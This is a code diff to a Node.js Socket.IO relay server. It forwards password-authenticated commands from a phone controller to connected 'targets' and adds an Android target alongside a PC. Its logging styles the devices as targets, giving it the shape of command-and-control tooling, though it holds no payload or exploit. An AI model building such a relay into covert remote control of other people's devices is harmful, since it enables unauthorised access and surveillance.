@@ -24,6 +24,7 @@ if (!process.env.AUTH_PASSWORD) {
 
 // Store connected clients
 let pcSocketId = null;
+let androidSocketId = null;
 const AUTH_PASSWORD = process.env.AUTH_PASSWORD;
 const authenticatedClients = new Set();
 
@@ -36,9 +37,13 @@ io.on('connection', (socket) => {
             pcSocketId = socket.id;
             console.log(`[!] PRIMARY TARGET (PC) CONNECTED: ${socket.id}`);
             io.emit('status', 'ONLINE'); // Tell phone PC is online
+        } else if (type === 'android') {
+            androidSocketId = socket.id;
+            console.log(`[!] MOBILE TARGET (ANDROID) CONNECTED: ${socket.id}`);
+            io.emit('status', 'ONLINE');
         } else if (type === 'mobile') {
             console.log(`[+] CONTROLLER (MOBILE) CONNECTED: ${socket.id}`);
-            if (pcSocketId) socket.emit('status', 'ONLINE');
+            if (pcSocketId || androidSocketId) socket.emit('status', 'ONLINE');
         }
     });
 
@@ -54,18 +59,29 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Relay Commands from Phone -> PC
+    // Relay Commands from Phone -> PC/Android
     socket.on('command', (data) => {
         if (!authenticatedClients.has(socket.id)) {
             console.log(`[!] UNAUTHORIZED COMMAND ATTEMPT: ${socket.id}`);
             return;
         }
 
+        let sent = false;
+
         if (pcSocketId) {
-            console.log(`[>] RELAYING COMMAND: ${data.action}`);
+            console.log(`[>] RELAYING COMMAND TO PC: ${data.action}`);
             io.to(pcSocketId).emit('execute', data);
-        } else {
-            console.log(`[X] FAILED: PC NOT CONNECTED`);
+            sent = true;
+        }
+
+        if (androidSocketId) {
+            console.log(`[>] RELAYING COMMAND TO ANDROID: ${data.action}`);
+            io.to(androidSocketId).emit('execute', data);
+            sent = true;
+        }
+
+        if (!sent) {
+            console.log(`[X] FAILED: NO TARGETS CONNECTED`);
         }
     });
 
@@ -73,7 +89,14 @@ io.on('connection', (socket) => {
         if (socket.id === pcSocketId) {
             console.log(`[!] PC DISCONNECTED`);
             pcSocketId = null;
-            io.emit('status', 'OFFLINE');
+        }
+        if (socket.id === androidSocketId) {
+            console.log(`[!] ANDROID DISCONNECTED`);
+            androidSocketId = null;
+        }
+        
+        if (!pcSocketId && !androidSocketId) {
+             io.emit('status', 'OFFLINE');
         }
         authenticatedClients.delete(socket.id);
     });
